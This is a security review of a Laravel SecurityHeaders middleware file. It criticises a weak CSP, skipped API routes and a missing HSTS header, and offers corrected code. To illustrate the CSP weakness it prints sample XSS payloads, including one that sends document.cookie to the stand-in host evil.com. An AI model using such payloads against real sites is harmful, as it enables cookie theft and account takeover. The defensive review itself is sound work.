# File Review: SecurityHeaders.php

**Review Date:** 2026-07-14  
**Reviewer:** Senior Software Engineer + Security Reviewer  
**File:** app/Http/Middleware/SecurityHeaders.php  
**Lines:** 48  
**Type:** Security Middleware - HTTP Security Headers

---

## File Information

**Path:** `app/Http/Middleware/SecurityHeaders.php`  
**Type:** HTTP Middleware  
**Lines:** 48  
**Complexity:** Low  

**Purpose:**  
Adds security headers to HTTP responses:
- Content Security Policy (CSP)
- X-Frame-Options (clickjacking protection)
- X-Content-Type-Options (MIME sniffing protection)
- Referrer-Policy
- XSS Protection header

**Security Impact:** 🔴 CRITICAL - Primary defense against XSS, clickjacking, and other attacks

---

## Overall Score

**Code Quality:** 6.0/10  
**Security:** 3.5/10 🔴  
**Performance:** 8.0/10  
**Maintainability:** 7.0/10  
**Laravel Best Practice:** 6.0/10  

**Overall Score:** 5.1/10

**Decision:** 🔴 **REQUEST CRITICAL CHANGES - CSP CONFIGURATION DANGEROUSLY WEAK**

---

## Strengths

1. ✅ **Proper Return Type** - Response type declared
2. ✅ **X-XSS-Protection Disabled** - Correctly set to '0' (deprecated header)
3. ✅ **Basic Headers Present** - XCTO, X-Frame-Options, Referrer-Policy
4. ✅ **Structured CSP** - Uses array for readability

---

## CRITICAL ISSUES

### Issue #1: CSP Allows 'unsafe-inline' and 'unsafe-eval'

**Severity:** 🔴 BLOCKING  
**Category:** Security - XSS Protection  
**Location:** Line 33

**Evidence:**
```php
$csp = [
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net ...",
    // ↑ CRITICAL: Completely defeats CSP protection!
];
```

**Problem:**
The CSP allows `'unsafe-inline'` and `'unsafe-eval'`, which **completely defeats** the purpose of Content Security Policy:

**What This Means:**
```javascript
// With 'unsafe-inline', ALL of these XSS attacks work:

// Attack 1: Inline script injection
<script>alert(document.cookie)</script>  // ✓ ALLOWED!

// Attack 2: Event handler injection
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">  // ✓ ALLOWED!

// Attack 3: JavaScript URL injection
<a href="javascript:alert(1)">Click</a>  // ✓ ALLOWED!

// With 'unsafe-eval', these also work:
eval(userInput);  // ✓ ALLOWED!
new Function(userInput)();  // ✓ ALLOWED!
setTimeout(userInput, 0);  // ✓ ALLOWED!
```

**Impact:**
- **NO XSS protection** - CSP is effectively disabled
- Stored XSS attacks work
- Reflected XSS attacks work
- DOM-based XSS attacks work
- All inline script injection succeeds

**Why Developers Do This:**
Often added to "fix" CSP errors during development, then forgotten.

**Correct Fix - Use Nonces:**
```php
public function handle(Request $request, Closure $next): Response
{
    // Generate nonce for this request
    $nonce = base64_encode(random_bytes(16));
    $request->attributes->set('csp_nonce', $nonce);
    
    $response = $next($request);
    
    // Don't skip API routes (see Issue #2)
    
    $response->headers->set('X-Content-Type-Options', 'nosniff');
    $response->headers->set('X-Frame-Options', 'DENY');
    $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
    $response->headers->set('X-XSS-Protection', '0');
    
    $csp = [
        "default-src 'self'",
        // Use nonce instead of unsafe-inline
        "script-src 'self' 'nonce-{$nonce}' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com",
        "style-src 'self' 'nonce-{$nonce}' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://fonts.googleapis.com",
        // Remove unsafe-eval completely - if needed, refactor code
        "font-src 'self' data: https://fonts.gstatic.com",
        "img-src 'self' data: https:",
        "connect-src 'self' https://api-merchant.payos.vn https://api.payos.vn",
        "frame-src 'self' https://sandbox.vnpayment.vn",
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'none'",  // Better than X-Frame-Options
    ];
    
    $response->headers->set('Content-Security-Policy', implode('; ', $csp));
    
    return $response;
}
```

**In Blade Templates:**
```blade
{{-- Use the nonce in script tags --}}
<script nonce="{{ request()->attributes->get('csp_nonce') }}">
    // Inline JavaScript here
    console.log('This script has the correct nonce');
</script>

{{-- External scripts don't need nonce --}}
<script src="{{ asset('js/app.js') }}"></script>
```

**Alternative - Use Hashes:**
```php
// If you have a few fixed inline scripts, use hashes
$csp = [
    // hash of specific inline script
    "script-src 'self' 'sha256-abc123...'",
];

// Generate hash with:
// echo -n "console.log('hello')" | openssl dgst -sha256 -binary | openssl base64
```

---

### Issue #2: Skips API Routes Completely

**Severity:** 🟠 HIGH  
**Category:** Security - API Protection  
**Location:** Lines 18-21

**Evidence:**
```php
// Only apply to non-API responses to avoid breaking API clients
if ($request->is('api/*')) {
    return $response;  // ← Skips ALL security headers for API!
}
```

**Problem:**
API routes get NO security headers at all. This is wrong because:

1. **APIs need CORS headers** (separate middleware)
2. **APIs need security headers too**:
   - X-Content-Type-Options (prevents MIME confusion)
   - X-Frame-Options (some APIs serve HTML)
   - Referrer-Policy (privacy)

3. **Some attacks target APIs**:
   - MIME type confusion
   - Clickjacking (if API returns HTML)
   - Information leakage via referrer

**Why This Was Added:**
Likely because CSP breaks JSON responses, but that's incorrect - CSP applies to browser rendering, not API clients.

**Correct Fix:**
```php
public function handle(Request $request, Closure $next): Response
{
    $response = $next($request);
    
    // Apply security headers to ALL responses
    $response->headers->set('X-Content-Type-Options', 'nosniff');
    $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
    $response->headers->set('X-XSS-Protection', '0');
    
    // Only apply these to HTML responses
    if ($this->isHtmlResponse($response)) {
        $response->headers->set('X-Frame-Options', 'DENY');
        
        // CSP only for HTML
        $nonce = $request->attributes->get('csp_nonce', '');
        $csp = [/* ... */];
        $response->headers->set('Content-Security-Policy', implode('; ', $csp));
    }
    
    return $response;
}

private function isHtmlResponse(Response $response): bool
{
    $contentType = $response->headers->get('Content-Type', '');
    return str_contains($contentType, 'text/html');
}
```

---

### Issue #3: Missing HSTS Header

**Severity:** 🟠 HIGH  
**Category:** Security - HTTPS Enforcement  
**Location:** Missing header

**Evidence:**
```php
// No Strict-Transport-Security header
```

**Problem:**
No HTTP Strict Transport Security (HSTS) header. Without HSTS:
- First request can be intercepted (even if HTTPS redirect exists)
- Users vulnerable to SSL stripping attacks
- Mixed content warnings don't prevent HTTP access
- Not eligible for HSTS preload list

**Impact:**
- Man-in-the-middle attacks possible on first visit
- Users can be downgraded to HTTP
- Cookies can be stolen over HTTP
- Not meeting security best practices

**Recommended Fix:**
```php
// Add HSTS header (only on HTTPS!)
if ($request->secure()) {
    $response->headers->set(
        'Strict-Transport-Security',
        'max-age=31536000; includeSubDomains; preload'
    );
}

// max-age=31536000: 1 year
// includeSubDomains: apply to all subdomains
// preload: eligible for browser preload list
```

**Important:** Only send HSTS on HTTPS responses. Sending on HTTP causes errors.

---

### Issue #4: CSP Nonce Generated But Not Used

**Severity:** 🟡 MEDIUM  
**Category:** Code Quality  
**Location:** Line 29

**Evidence:**
```php
$nonce = $request->attributes->get('csp_nonce', '');
// ↑ Gets nonce but never uses it in CSP
```

**Problem:**
Code retrieves CSP nonce but doesn't use it. This suggests:
- Previous attempt to implement nonce-based CSP
- Gave up and added 'unsafe-inline' instead
- Dead code left behind

**Recommended Fix:**
Either use the nonce properly (see Issue #1) or remove this line.

---

### Issue #5: Missing Permissions-Policy Header

**Severity:** 🟡 MEDIUM  
**Category:** Security - Feature Restrictions  
**Location:** Missing header

**Evidence:**
```php
// No Permissions-Policy header
```

**Problem:**
No Permissions-Policy (formerly Feature-Policy) header to restrict browser features:
- Camera
- Microphone
- Geolocation
- Payment APIs
- etc.

**Recommended Fix:**
```php
// Restrict sensitive browser features
$response->headers->set(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(self), payment=(self)'
);

// Format: feature=(allowed-origins)
// () = nobody
// (self) = same origin only
// (*) = everyone (avoid!)
```

---

### Issue #6: Overly Permissive img-src

**Severity:** 🟡 MEDIUM  
**Category:** Security - CSP Configuration  
**Location:** Line 36

**Evidence:**
```php
"img-src 'self' data: https: blob:",
//                    ^^^^^^ Allows ANY HTTPS domain!
```

**Problem:**
`https:` allows images from ANY HTTPS domain. While images are less dangerous than scripts, they can still:
- Track users
- Exfiltrate data via image dimensions
- Be used in timing attacks

**Recommended Fix:**
```php
// Be specific about allowed image sources
"img-src 'self' data: blob: https://cdn.example.com https://storage.example.com",

// Or use 'strict-dynamic' for runtime-generated images
"img-src 'self' data: blob: https://trusted-cdn.com",
```

---

### Issue #7: X-Frame-Options vs CSP frame-ancestors

**Severity:** 🔵 LOW  
**Category:** Best Practice  
**Location:** Line 24

**Evidence:**
```php
$response->headers->set('X-Frame-Options', 'DENY');
```

**Problem:**
X-Frame-Options is legacy. CSP `frame-ancestors` is more flexible and standard.

**Recommended Fix:**
```php
// In CSP array:
"frame-ancestors 'none'",  // Same as X-Frame-Options: DENY

// Keep X-Frame-Options for older browsers:
$response->headers->set('X-Frame-Options', 'DENY');
```

---

### Issue #8: No Subresource Integrity for CDN Resources

**Severity:** 🟡 MEDIUM  
**Category:** Security - Supply Chain  
**Location:** CSP allows CDN without SRI requirement

**Evidence:**
```php
"script-src 'self' ... https://cdn.jsdelivr.net https://cdnjs.cloudflare.com",
```

**Problem:**
Allows loading scripts from CDNs without requiring Subresource Integrity (SRI). If CDN is compromised, all users affected.

**Recommended Fix:**
```blade
{{-- Use SRI hashes for CDN resources --}}
<script 
    src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.js"
    integrity="sha384-abc123..."
    crossorigin="anonymous">
</script>

{{-- Or use require-sri-for directive (deprecated but useful) --}}
```

```php
// In CSP, you can't enforce SRI directly, but you can:
// 1. Use strict CSP (no unsafe-inline)
// 2. Use nonces for your own inline scripts
// 3. Use SRI in HTML for external resources
```

---

## Recommendations

### IMMEDIATE (CRITICAL)

1. **⚠️ REMOVE 'unsafe-inline' and 'unsafe-eval'** - Implement nonce-based CSP
2. **Apply Security Headers to ALL Routes** - Remove API skip logic
3. **Add HSTS Header** - Force HTTPS with proper configuration
4. **Fix CSP Nonce** - Either use it or remove it

### HIGH PRIORITY

5. **Add Permissions-Policy** - Restrict sensitive browser features
6. **Restrict img-src** - Don't allow all HTTPS domains
7. **Add frame-ancestors to CSP** - Better than X-Frame-Options alone
8. **Document CSP Implementation** - Guide for developers

### MEDIUM PRIORITY

9. **Add CSP Report-URI** - Monitor policy violations
10. **Consider CSP Report-Only Mode** - Test before enforcing
11. **Add SRI Requirements** - Document SRI usage for CDN
12. **Environment-Specific CSP** - Different policies for dev/prod

---

## CSP Migration Strategy

**Step 1: Report-Only Mode**
```php
// Don't enforce yet, just report violations
$response->headers->set(
    'Content-Security-Policy-Report-Only',
    implode('; ', $csp) . '; report-uri /csp-report'
);
```

**Step 2: Add Reporting Endpoint**
```php
// routes/web.php
Route::post('/csp-report', [CspController::class, 'report']);

// CspController
public function report(Request $request)
{
    Log::warning('CSP Violation', $request->json()->all());
    return response()->noContent();
}
```

**Step 3: Fix Violations**
- Replace inline scripts with nonces
- Move inline styles to external files
- Remove eval() usage

**Step 4: Enforce Policy**
- Switch from Report-Only to enforcing
- Monitor for issues
- Iterate

---

## Complete Improved Version

```php
<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        // Generate nonce BEFORE request processing
        $nonce = base64_encode(random_bytes(16));
        $request->attributes->set('csp_nonce', $nonce);
        
        $response = $next($request);
        
        // Apply to ALL responses
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('X-XSS-Protection', '0');
        
        // HSTS (only on HTTPS)
        if ($request->secure()) {
            $response->headers->set(
                'Strict-Transport-Security',
                'max-age=31536000; includeSubDomains; preload'
            );
        }
        
        // Permissions-Policy
        $response->headers->set(
            'Permissions-Policy',
            'camera=(), microphone=(), geolocation=(self), payment=(self)'
        );
        
        // Apply CSP only to HTML responses
        if ($this->isHtmlResponse($response)) {
            $response->headers->set('X-Frame-Options', 'DENY');
            
            $csp = [
                "default-src 'self'",
                "script-src 'self' 'nonce-{$nonce}' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com",
                "style-src 'self' 'nonce-{$nonce}' https://fonts.googleapis.com",
                "font-src 'self' data: https://fonts.gstatic.com",
                "img-src 'self' data: blob: https://cdn.example.com",
                "connect-src 'self' https://api-merchant.payos.vn",
                "frame-src 'self' https://sandbox.vnpayment.vn",
                "object-src 'none'",
                "base-uri 'self'",
                "form-action 'self'",
                "frame-ancestors 'none'",
                "upgrade-insecure-requests",
            ];
            
            if (config('app.debug')) {
                // Report-only in development
                $response->headers->set(
                    'Content-Security-Policy-Report-Only',
                    implode('; ', $csp) . '; report-uri /csp-report'
                );
            } else {
                // Enforce in production
                $response->headers->set(
                    'Content-Security-Policy',
                    implode('; ', $csp)
                );
            }
        }
        
        return $response;
    }
    
    private function isHtmlResponse(Response $response): bool
    {
        $contentType = $response->headers->get('Content-Type', '');
        return str_contains($contentType, 'text/html');
    }
}
```

---

## Summary

SecurityHeaders middleware has **critical CSP weaknesses** that completely negate its XSS protection.

**Critical Issues:**
1. **'unsafe-inline' and 'unsafe-eval'** - Defeats entire CSP protection
2. **Skips API routes** - No security headers for APIs
3. **No HSTS** - Vulnerable to SSL stripping
4. **Nonce unused** - Dead code suggests previous failed implementation

**Impact:**
Current CSP provides **ZERO XSS protection**. Any XSS vulnerability in the application is exploitable because CSP allows all inline scripts.

**Required Actions:**
- Remove unsafe-inline/unsafe-eval immediately
- Implement nonce-based CSP
- Add HSTS header
- Apply headers to all routes

This is not a cosmetic issue - this is a **fundamental security failure** that leaves the application vulnerable to XSS attacks.

**Status:** 🔴 CRITICAL changes required - Current CSP is ineffective

---

*Review completed: 2026-07-14 03:21 AM*  
*File #18/137 - Phase 2: Security Layer (2/12 complete)*
